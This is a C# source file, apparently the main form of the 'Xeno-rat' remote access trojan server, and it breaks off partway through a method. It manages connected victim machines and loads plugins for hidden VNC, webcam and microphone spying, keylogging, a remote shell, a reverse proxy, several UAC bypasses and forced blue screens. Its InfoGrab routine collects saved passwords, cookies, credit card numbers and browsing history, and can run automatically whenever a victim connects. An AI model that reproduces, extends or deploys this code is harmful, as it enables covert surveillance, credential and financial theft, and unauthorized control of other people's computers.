using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.ListView;
using Microsoft.VisualBasic;
using System.Windows.Forms.VisualStyles;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Vestris.ResourceLib;
using System.Runtime.InteropServices;
using System.Security;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using Newtonsoft.Json;
using System.Reflection.Emit;
using Newtonsoft.Json.Linq;
using xeno_rat_server.Forms;
using System.IO.Compression;
using System.Net;
using System.ComponentModel.Composition;
using MaxMind.GeoIP2;
using MaxMind.GeoIP2.Responses;

namespace xeno_rat_server
{
    public partial class MainForm : Form
    {

        private DatabaseReader ip2countryDatabase;

        private Listener ListeningHandler;
        private static Dictionary<int, Node> clients = new Dictionary<int, Node>();
        private static int currentCount = 0;
        private static byte[] key = new byte[32] { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 };
        private static string string_key = "1234";
        private static int ListviewItemCount_old = 6;
        private static int ListviewItemCount = 7;
        private Dictionary<string, string[]> Commands = new Dictionary<string, string[]>();
        private List<string> OnConnectTasks = new List<string>();
        private System.Windows.Forms.Timer ConfigUpdateTimer;
        private string LastConfig = "";

        private static bool LogErrors = true;


        public MainForm()
        {
            
            InitializeComponent();
            this.Text = "Xeno-rat: Created by moom825 - version 1.8.5";
            key = Utils.CalculateSha256Bytes(string_key);

            ListeningHandler =new Listener(OnConnect);

            string[] Power = new string[2];
            Power[0] = "Shutdown";
            Power[1] = "Restart";

            string[] Client = new string[3];
            Client[0] = "Close";
            Client[1] = "Relaunch";
            Client[2] = "Uninstall";

            string[] Surveillance = new string[6];
            Surveillance[0] = "Hvnc";
            Surveillance[1] = "WebCam";
            Surveillance[2] = "Live Microphone";
            Surveillance[3] = "Key Logger";
            Surveillance[4] = "Offline Key Logger";
            Surveillance[5] = "Screen Control";

            string[] Fun = new string[4];
            Fun[0] = "Chat";
            Fun[1] = "BlueScreen";
            Fun[2] = "Message Box";
            Fun[3] = "Fun Menu";

            string[] System = new string[8];
            System[0] = "Reverse proxy";
            System[1] = "Process Manager";
            System[2] = "File Manager";
            System[3] = "Registry Manager";
            System[4] = "Shell";
            System[5] = "InfoGrab";
            System[6] = "Startup";
            System[7] = "Remove Startup";


            string[] Uac_Bypass = new string[3];
            Uac_Bypass[0] = "Cmstp";
            Uac_Bypass[1] = "Windir + Disk Cleanup";
            Uac_Bypass[2] = "Fodhelper";

            string[] Uac_Options = new string[2];
            Uac_Options[0] = "Request admin";
            Uac_Options[1] = "De-escalate to user";

            string[] Debug_Info = new string[1];
            Debug_Info[0] = "Debug";

            Commands["Fun"] = Fun;
            Commands["Surveillance"] = Surveillance;
            Commands["System"] = System;
            Commands["Uac Bypass"] = Uac_Bypass;
            Commands["Uac Options"] = Uac_Options;
            Commands["Client"] = Client;
            Commands["Power"] = Power;
            Commands["Debug Info"] = Debug_Info;
        }

        private async Task OnConnect(Socket socket)
        {
            int currentIdCount = currentCount++;
            Node client = await Utils.ConnectAndSetupAsync(socket, key, currentIdCount, OnDisconnect);
            if (client == null) 
            {
                try
                {
                    await Task.Factory.FromAsync(socket.BeginDisconnect, socket.EndDisconnect, true, null);
                }
                catch
                {
                    socket.Close(0);
                    socket.Dispose();
                }
                return;
            }
            if (client.SockType == 0)
            {
                ListViewItem clientdata = null;
                try
                {
                    clients[currentIdCount] = client;
                    clientdata = await GetAddInfo(client);
                }
                catch 
                {
                    clientdata = null;
                }
                if (clientdata == null) 
                {
                    client.Disconnect();
                    return;
                }
                
                List<ListViewItem> possibleDuplicates = GetClientsByHwid(clientdata.Text);
                List<string[]> duplicates = new List<string[]>();
                foreach (ListViewItem i in possibleDuplicates) 
                {
                    string[] match = new string[] { i.SubItems[2].Text, i.SubItems[7].Text };
                    duplicates.Add(match);
                }

                if (duplicates.Count > 0 && duplicates.Contains(new string[] { clientdata.SubItems[2].Text, clientdata.SubItems[7].Text })) 
                {
                    client.Disconnect();
                    return;
                }

                listView2.Invoke((MethodInvoker)(() =>//add the clientdata to the listview
                {
                    clientdata = listView2.Items.Add(clientdata);
                }));

                Node HeartSock=await client.CreateSubNodeAsync(1);//create HeartBeat Node
                if (HeartSock == null) 
                {
                    client.Disconnect();
                    return;
                }
                try
                {
                    ListViewUpdater(clientdata, client);
                }
                catch { }
                AddLog("new Client connected!", Color.Green);
                await HeartBeat(HeartSock, client);
            }
            else 
            {
                client.Parent = clients[client.ID];
                await clients[client.ID].AddSubNode(client);
            }
        }

        private List<ListViewItem> GetClientsByHwid(string hwid)
        {
            List<ListViewItem> results = new List<ListViewItem>();
            foreach (ListViewItem cliView in listView2.Items)
            {
                if (cliView.Text == hwid)
                {
                    results.Add(cliView);
                }
            }
            return results;
        }

        private async Task CompleteOnConnectTasks(Node client) 
        {
            foreach (string i in OnConnectTasks) 
            {
                try
                {
                    if (i == "Start OfflineKeylogger")
                    {
                        Node subClient = await client.CreateSubNodeAsync(2);
                        bool worked = await Utils.LoadDllAsync(subClient, "OfflineKeyLogger", File.ReadAllBytes("plugins\\KeyLoggerOffline.dll"), AddLog);
                        if (!worked)
                        {
                            continue;
                        }
                        await subClient.ReceiveAsync();
                        await subClient.SendAsync(new byte[] { 1 });
                        await Task.Delay(500);
                        subClient.Disconnect();
                    }
                    else if (i == "Infograber") 
                    {
                        Node subClient = await client.CreateSubNodeAsync(2);
                        bool worked = await Utils.LoadDllAsync(subClient, "InfoGrab", File.ReadAllBytes("plugins\\InfoGrab.dll"), AddLog);
                        if (!worked)
                        {
                            continue;
                        }
                        string cookies = "";
                        string passwords = "";
                        string ccs = "";
                        string history = "";
                        string downloads = "";
                        await subClient.SendAsync(new byte[] { 0 });
                        byte[] data = await subClient.ReceiveAsync();
                        if (data == null) 
                        {
                            goto end;
                        }
                        var loginlist = InfoGrab.DeserializeLoginList(data);
                        for (int x = 0; x < loginlist.Count; x++) 
                        {
                            passwords+=loginlist[x].ToString() + "\n";
                        }
                        await subClient.SendAsync(new byte[] { 1 });
                        data = await subClient.ReceiveAsync();
                        if (data == null)
                        {
                            goto end;
                        }
                        var cookielist = InfoGrab.DeserializeCookieList(data);
                        for (int x = 0; x < cookielist.Count; x++)
                        {
                            cookies += cookielist[x].ToString() + "\n";
                        }
                        await subClient.SendAsync(new byte[] { 2 });
                        data = await subClient.ReceiveAsync();
                        if (data == null)
                        {
                            goto end;
                        }
                        var cclist = InfoGrab.DeserializeCreditCardList(data);
                        for (int x = 0; x < cclist.Count; x++)
                        {
                            ccs += cclist[x].ToString() + "\n";
                        }
                        await subClient.SendAsync(new byte[] { 3 });
                        data = await subClient.ReceiveAsync();
                        if (data == null)
                        {
                            goto end;
                        }
                        var downloadlist = InfoGrab.DeserializeDownloadList(data);
                        for (int x = 0; x < downloadlist.Count; x++)
                        {
                            downloads += downloadlist[x].ToString() + "\n";
                        }
                        await subClient.SendAsync(new byte[] { 4 });
                        data = await subClient.ReceiveAsync();
                        if (data == null)
                        {
                            goto end;
                        }
                        var historylist=InfoGrab.DeserializeWebHistoryList(data);
                        for (int x = 0; x < historylist.Count; x++)
                        {
                            history += historylist[x].ToString() + "\n";
                        }
                        end:
                        subClient.Disconnect();

                        using (MemoryStream memoryStream = new MemoryStream())
                        {
                            using (ZipArchive archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
                            {
                                Utils.AddTextToZip(archive, "cookies.txt", cookies);
                                Utils.AddTextToZip(archive, "passwords.txt", passwords);
                                Utils.AddTextToZip(archive, "ccs.txt", ccs);
                                Utils.AddTextToZip(archive, "history.txt", history);
                                Utils.AddTextToZip(archive, "downloads.txt", downloads);
                            }
                            byte[] zipData = memoryStream.ToArray();
                            string directory = "OnConnectInfoGrabbedData";
                            string path=Path.Combine(new string[] { directory, DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString()+"- InfoGrab.zip" });
                            if (!Directory.Exists(directory)) 
                            { 
                                Directory.CreateDirectory(directory);
                            }
                            File.WriteAllBytes(path, zipData);
                        } 
                    }
                }
                catch 
                {
                    AddLog($"Error autostarting \"{i}\"", Color.Red);
                }
            }
        }
        
        private async Task<ListViewItem> GetAddInfo(Node type0node)
        {

            if (type0node.SockType != 0)
            {
                return null;
            }
            byte[] reqdataop = new byte[] { 1 };
            if (!(await type0node.SendAsync(reqdataop)))
            {
                return null;
            }
            byte[] data = await type0node.ReceiveAsync();
            if (data == null) 
            {
                return null;
            }
            string[] strings = new string[ListviewItemCount];
            int start = 0;
            int end = 0;
            int count = 0;
            for(int b=0;b<data.Length;b++) 
            {
                end++;
                bool f = b == data.Length - 1;
                if (data[b] == 0 || f)
                {
                    int subamt = 1;
                    if (f) 
                    {
                        subamt = 0;
                    }
                    int d = end - start- subamt;
                    byte[] temp = new byte[d];
                    for (var i = 0; i < d; i++) 
                    {
                        temp[i] = data[start + i];
                    }
                    strings[count] = Encoding.UTF8.GetString(temp);
                    count++;
                    if (count > strings.Length) 
                    {
                        return null;
                    }
                    start=end;
                }
            }
            if (strings[strings.Length-2] == null) 
            {
                return null;
            }
            if (strings[strings.Length - 1] == null) // this is here for combatibility reasons for older stubs
            {
                string[] temp = new string[strings.Length];
                strings.CopyTo(temp, 0);
                strings[2] = "N/A";

                for (int i = 2; i < temp.Length-1; i++) 
                {
                    strings[i+1]= temp[i];
                }

            }
            ListViewItem lvi = new ListViewItem();
            ListViewItem item=null;
            lvi.Tag = type0node;

            string ipAddress = type0node.GetIp();

            string flag = "missing";
            try
            {
                CountryResponse ipData = ip2countryDatabase.Country(ipAddress);
                if (ipData.Country!=null)
                {
                    flag = ipData.Country.IsoCode;
                }
                
            }
            catch 
            { 
            }
            lvi.ImageKey = flag;
            lvi.Text = strings[0];
            lvi.SubItems.Add(ipAddress);
            lvi.SubItems.Add(strings[1]);
            lvi.SubItems.Add(strings[2]);
            lvi.SubItems.Add(strings[3]);
            lvi.SubItems.Add(strings[4]);
            lvi.SubItems.Add(strings[5]);
            lvi.SubItems.Add(strings[6]);
            lvi.SubItems.Add("");
            lvi.SubItems.Add("0");
            lvi.SubItems.Add("0");
            
            return lvi; 
        } 

        private void OnDisconnect(Node client)
        {
            if (client.SockType == 0) 
            {
                listView2.Invoke((MethodInvoker)(() =>
                {
                    foreach (ListViewItem i in listView2.Items) 
                    {
                        if (i.Tag == client) 
                        {
                            i.Remove();
                            AddLog("Client disconnected!", Color.Red);
                        }
                    }
                }));
            }
        }

        private async Task ListViewUpdater(ListViewItem item, Node client) 
        {
            if (item == null) 
            {
                return;
            }
            byte[] get_update_info = new byte[] { 0 };
            Node subnode = await client.CreateSubNodeAsync(2);
            CompleteOnConnectTasks(client);
            if (subnode == null) 
            {
                return;
            }
            while (subnode.Connected() && client.Connected()) 
            {
                Stopwatch timer = new Stopwatch();
                timer.Start();
                await subnode.SendAsync(get_update_info);
                byte[] data=await subnode.ReceiveAsync();
                timer.Stop();
                TimeSpan timeTaken = timer.Elapsed;
                if (data == null) 
                {
                    break;
                }
                string info = Encoding.UTF8.GetString(data);
                string window = info;
                string idle_time = "N/A";
                if (info.Contains("\n"))
                {
                    string[] split_data = info.Split('\n');
                    window = split_data[0];
                    idle_time = split_data[1];
                }
                listView2.BeginInvoke((MethodInvoker)(() =>
                {
                    item.SubItems[8].Text = window;
                    item.SubItems[9].Text = ((int)timeTaken.TotalMilliseconds).ToString();
                    item.SubItems[10].Text = idle_time;
                }));
                await Task.Delay(2000);
            }
            subnode.Disconnect();
            
        }

        private async Task HeartBeat(Node HeartSock, Node MainSock)
        {
            if (HeartSock == null)
            {
                MainSock.Disconnect();
                return;
            }
            HeartSock.SetRecvTimeout(5000);
            while (HeartSock.Connected() && MainSock.Connected()) 
            {
                byte[] reqHeart = new byte[] { 0 };
                await HeartSock.SendAsync(reqHeart);
                byte[] data=await HeartSock.ReceiveAsync();
                if (data == null) 
                {
                    break;
                }
                int op = data[0];
                if (op == 3)
                {
                    try {
                        string error_msg=Encoding.UTF8.GetString(data, 1, data.Length - 1);
                        if (LogErrors) 
                        {
                            AddLog("Application error has occurred: " + error_msg, Color.Red);
                        }
                    } catch { }
                    break;
                }
                else if (op != 1)
                {
                    break;
                }
                await Task.Delay(1000);
            }
            MainSock.Disconnect();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            Icon = Icon.ExtractAssociatedIcon(System.Reflection.Assembly.GetExecutingAssembly().Location);
            listView2.GetType().GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic).SetValue(listView2, true, null);
            listView3.GetType().GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic).SetValue(listView3, true, null);
            ConfigUpdateTimer = new System.Windows.Forms.Timer();
            ConfigUpdateTimer.Tick += new EventHandler(ConfigUpdateTimer_Tick);
            ConfigUpdateTimer.Interval = 10000;
            if (File.Exists("Config.json"))
            {
                DeserializeControlsFromJson(File.ReadAllText("Config.json"));
            }
            ConfigUpdateTimer.Start();

            ImageList list = new ImageList();
            foreach (string i in Directory.EnumerateFiles("country_flags")) 
            {
                if (i.EndsWith(".png")) 
                {
                    list.Images.Add(Path.GetFileName(i).Replace(".png", ""), Image.FromFile(i));
                }
                
            }
            listView2.SmallImageList = list;
            ip2countryDatabase = new DatabaseReader(Path.Combine("country_flags", "GeoLite2-Country.mmdb"));

            AddLog("Started!", Color.Green);
        }

        private string SerializeControlsToJson()
        {
            Dictionary<string, object> controlData = new Dictionary<string, object>();

            controlData["textBox15"] = textBox15.Text;
            controlData["textBox13"] = textBox13.Text;
            controlData["textBox14"] = textBox14.Text;
            controlData["textBox2"] = textBox2.Text;
            controlData["textBox16"] = textBox16.Text;
            controlData["textBox12"] = textBox12.Text;
            controlData["textBox6"] = textBox6.Text;
            controlData["textBox8"] = textBox8.Text;
            controlData["textBox4"] = textBox4.Text;
            controlData["textBox9"] = textBox9.Text;
            controlData["textBox3"] = textBox3.Text;
            controlData["textBox11"] = textBox11.Text;
            controlData["textBox10"] = textBox10.Text;
            controlData["textBox7"] = textBox7.Text;
            controlData["label16"] = label16.Text;
            controlData["checkBox1"] = checkBox1.Checked;
            controlData["checkBox2"] = checkBox2.Checked;
            controlData["checkBox3"] = checkBox3.Checked;
            controlData["checkBox4"] = checkBox4.Checked;
            controlData["OnConnectTasks"] = OnConnectTasks;
            controlData["string_key"] = string_key;
            List<int> ports = new List<int>();
            if (ListeningHandler != null)
            {
                foreach (int i in ListeningHandler.listeners.Keys)
                {
                    if (ListeningHandler.listeners[i].listening)
                    {
                        ports.Add(i);
                    }
                }
            }
            controlData["ports"] = ports.ToArray();
            string jsonData = JsonConvert.SerializeObject(controlData);
            return jsonData;
        }


        private void DeserializeControlsFromJson(string jsonData)
        {
            try
            {
                Dictionary<string, object> controlData = JsonConvert.DeserializeObject<Dictionary<string, object>>(jsonData);
                textBox15.Text = controlData["textBox15"].ToString();
                textBox13.Text = controlData["textBox13"].ToString();
                textBox14.Text = controlData["textBox14"].ToString();
                textBox2.Text = controlData["textBox2"].ToString();
                textBox16.Text = controlData["textBox16"].ToString();
                textBox12.Text = controlData["textBox12"].ToString();
                textBox6.Text = controlData["textBox6"].ToString();
                textBox8.Text = controlData["textBox8"].ToString();
                textBox4.Text = controlData["textBox4"].ToString();
                textBox9.Text = controlData["textBox9"].ToString();
                textBox3.Text = controlData["textBox3"].ToString();
                textBox11.Text = controlData["textBox11"].ToString();
                textBox10.Text = controlData["textBox10"].ToString();
                textBox7.Text = controlData["textBox7"].ToString();
                label16.Text = controlData["label16"].ToString();
                checkBox1.Checked = Convert.ToBoolean(controlData["checkBox1"]);
                checkBox2.Checked = Convert.ToBoolean(controlData["checkBox2"]);
                checkBox3.Checked = Convert.ToBoolean(controlData["checkBox3"]);
                checkBox4.Checked = Convert.ToBoolean(controlData["checkBox4"]);
                OnConnectTasks = ((JArray)controlData["OnConnectTasks"]).ToObject<List<string>>();
                foreach (string i in OnConnectTasks)
                {
                    listView4.Items.Add(i);
                }
                string_key = controlData["string_key"].ToString();
                label17.Text = "Current Password: " + string_key;
                key = Utils.CalculateSha256Bytes(string_key);
                int[] ports = ((JArray)controlData["ports"]).ToObject<int[]>();
                foreach (int i in ports)
                {
                    string string_port = i.ToString();
                    if (ListeningHandler.PortInUse(i))
                    {
                        MessageBox.Show($"The port {string_port} is currently in use! Press ok to skip.");
                        continue;
                    }
                    string[] row = { string_port };
                    var listViewItem = new ListViewItem(row);
                    listView1.Items.Add(listViewItem);
                    AddLog($"Listener on port {string_port} started!", Color.Green);
                    new Thread(() => ListeningHandler.CreateListener(i)).Start();
                }

            }
            catch (Exception ex)
            {
                MessageBox.Show("Error loading config: " + ex.Message, "Error");
            }
        }


        private void ConfigUpdateTimer_Tick(object sender, EventArgs e)
        {
            if (!File.Exists("Config.json"))
            {
                File.WriteAllText("Config.json", SerializeControlsToJson());
                return;
            }
            string newconfig = SerializeControlsToJson();
            if (LastConfig != newconfig) 
            {
                File.WriteAllText("Config.json", newconfig);
                LastConfig = newconfig;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            int port;
            string string_port = textBox1.Text;
            try 
            {
                 port=Int32.Parse(string_port);
            } 
            catch 
            {
                MessageBox.Show("That is not a valid number!");
                return;
            }
            if (port >= 65535)
            {
                MessageBox.Show("That is not a valid port number!");
                return;
            }
            if (ListeningHandler.PortInUse(port)) 
            {
                MessageBox.Show("That port is currently in use!");
                return;
            }
            string[] row = { string_port };
            var listViewItem = new ListViewItem(row);
            listView1.Items.Add(listViewItem);
            AddLog($"Listener on port {string_port} started!", Color.Green);
            new Thread(()=> ListeningHandler.CreateListener(port)).Start();
        }

        private void remove_port(ListViewItem portItem) 
        {
            int port = Int32.Parse(portItem.SubItems[0].Text);
            ListeningHandler.StopListener(port);
            AddLog($"Listener on port {port} stopped!", Color.Green);
            portItem.Remove();
        }

        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                ListViewItem focusedItem = listView1.FocusedItem;
                if (focusedItem != null && focusedItem.Bounds.Contains(e.Location))
                {
                    ContextMenuStrip PopupMenu = new ContextMenuStrip();
                    PopupMenu.Items.Add("Remove");
                    PopupMenu.ItemClicked += new ToolStripItemClickedEventHandler((object _, ToolStripItemClickedEventArgs __)=>  remove_port(focusedItem));
                    PopupMenu.Show(Cursor.Position);
                }
            }
        }

        private void listView2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }
        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            base.OnFormClosed(e);
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        private void AddLog(string message, Color textcolor) 
        {
            ListViewItem lvi = new ListViewItem();
            lvi.Text = DateTime.Now.ToString("hh:mm:ss tt");
            lvi.SubItems.Add(message);
            lvi.ForeColor = textcolor;
            listView3.BeginInvoke((MethodInvoker)(() => { listView3.Items.Insert(0, lvi); }));
        }
        
        private async Task StartChat(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Chat", File.ReadAllBytes("plugins\\Chat.dll"), AddLog);
                if (!worked) 
                {
                    MessageBox.Show("Error Starting chat!");
                    return;
                }
                Application.Run(new Forms.Chat(subClient));
                subClient.Disconnect();
            }
            catch 
            {
                MessageBox.Show("Error with chat!");
            }
        }
        private async Task StartProcessManager(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "ProcessManager", File.ReadAllBytes("plugins\\ProcessManager.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting ProcessManager!");
                    return;
                }
                Application.Run(new Forms.ProcessManager(subClient));
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with ProcessManager!");
            }
        }
        
        private async Task StartHvnc(Node client) 
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Hvnc", File.ReadAllBytes("plugins\\Hvnc.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting HVNC!");
                    return;
                }
                Application.Run(new Forms.Hvnc(subClient));
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with HVNC!");
            }
        }
        private async Task StartReverseProxy(Node client) 
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "ReverseProxy", File.ReadAllBytes("plugins\\ReverseProxy.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting ReverseProxy!");
                    return;
                }
                Application.Run(new Forms.Reverse_Proxy(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with ReverseProxy!" + e.Message); 
            }
        }
        private async Task StartFileManager(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "FileManager", File.ReadAllBytes("plugins\\File manager.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting FileManager!");
                    return;
                }
                Application.Run(new Forms.File_manager(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with FileManager!" + e.Message);
            }
        }
        private async Task StartRegistryManager(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "RegistryManager", File.ReadAllBytes("plugins\\Registry Manager.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting RegistryManager!");
                    return;
                }
                Application.Run(new Forms.Registry_Manager(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with RegistryManager!" + e.Message);
            }
        }
        private async Task StartLiveMicrophone(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "LiveMicrophone", File.ReadAllBytes("plugins\\LiveMicrophone.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting LiveMicrophone!");
                    return;
                }
                Application.Run(new Forms.Live_Microphone(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with LiveMicrophone!" + e.Message);
            }
        }
        private async Task StartShell(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Shell", File.ReadAllBytes("plugins\\Shell.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Shell!");
                    return;
                }
                Application.Run(new Forms.Shell(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Shell!" + e.Message);
            }
        }
        private async Task StartWebCam(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "WebCam", File.ReadAllBytes("plugins\\WebCam.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting WebCam!");
                    return;
                }
                Application.Run(new Forms.WebCam(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with WebCam!" + e.Message);
            }
        }
        private async Task StartKeyLogger(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "KeyLogger", File.ReadAllBytes("plugins\\KeyLogger.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting KeyLogger!");
                    return;
                }
                Application.Run(new Forms.KeyLogger(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with KeyLogger!" + e.Message);
            }
        }
        private async Task StartOfflineKeyLogger(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "OfflineKeyLogger", File.ReadAllBytes("plugins\\KeyLoggerOffline.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting KeyLoggerOffline!");
                    return;
                }
                Application.Run(new Forms.OfflineKeylogger(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with KeyLoggerOffline!" + e.Message);
            }
        }

        private async Task StartCmstpUacBypass(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Uacbypass!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 1 });
                subClient.SetRecvTimeout(5000);
                byte[] data=await subClient.ReceiveAsync();
                if (data == null || data[0] !=1) 
                {
                    MessageBox.Show("The Uacbypass most likely did not succeed");
                    return;
                }
                subClient.Disconnect();
                MessageBox.Show("The Uacbypass Started successfully! (this does not mean it 100% worked)");
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Uacbypass!" + e.Message);
            }
        }
        private async Task StartWinDirBypass(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Uacbypass!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 2 });
                subClient.SetRecvTimeout(5000);
                byte[] data = await subClient.ReceiveAsync();
                if (data == null || data[0] != 1)
                {
                    MessageBox.Show("The Uacbypass most likely did not succeed");
                    return;
                }
                subClient.Disconnect();
                MessageBox.Show("The Uacbypass Started successfully! (this does not mean it 100% worked)");
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Uacbypass!" + e.Message);
            }
        }
        private async Task StartFodHelperBypass(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Uacbypass!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 3 });
                subClient.SetRecvTimeout(5000);
                byte[] data = await subClient.ReceiveAsync();
                if (data == null || data[0] != 1)
                {
                    MessageBox.Show("The Uacbypass most likely did not succeed");
                    return;
                }
                subClient.Disconnect();
                MessageBox.Show("The Uacbypass Started successfully! (this does not mean it 100% worked)");
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Uacbypass!" + e.Message);
            }
        }
        private async Task StartRequestForAdmin(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Uacbypass dll!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 4 });
                subClient.SetRecvTimeout(20000);
                byte[] data = await subClient.ReceiveAsync();
                if (data == null || data[0] != 1)
                {
                    MessageBox.Show("The user most likely clicked no on the uac prompt (or it timed out)");
                    return;
                }
                subClient.Disconnect();
                MessageBox.Show("The user clicked yes! You should have admin.");
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Uacbypass dll!" + e.Message);
            }
        }
        private async Task StartDeescalateperms(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Uacbypass dll!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 5 });
                subClient.SetRecvTimeout(20000);
                byte[] data = await subClient.ReceiveAsync();
                if (data == null || data[0] != 1)
                {
                    MessageBox.Show("Failed to Start a new process with user perms.");
                    return;
                }
                subClient.Disconnect();
                MessageBox.Show("Started a new process with user perms.");
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Uacbypass dll!" + e.Message);
            }
        }
        private async Task StartScreenControl(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "ScreenControl", File.ReadAllBytes("plugins\\ScreenControl.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting ScreenControl!");
                    return;
                }
                Application.Run(new Forms.ScreenControl(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with ScreenControl!" + e.Message);
            }
        }
        private async Task StartBlueScreen(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Fun", File.ReadAllBytes("plugins\\Fun.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Fun dll!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 0 });
                await Task.Delay(1000);
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Fun dll!" + e.Message);
            }
        }
        private async Task StartInfoGrab(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "InfoGrab", File.ReadAllBytes("plugins\\InfoGrab.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting InfoGrab!");
                    return;
                }
                Application.Run(new Forms.InfoGrab(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
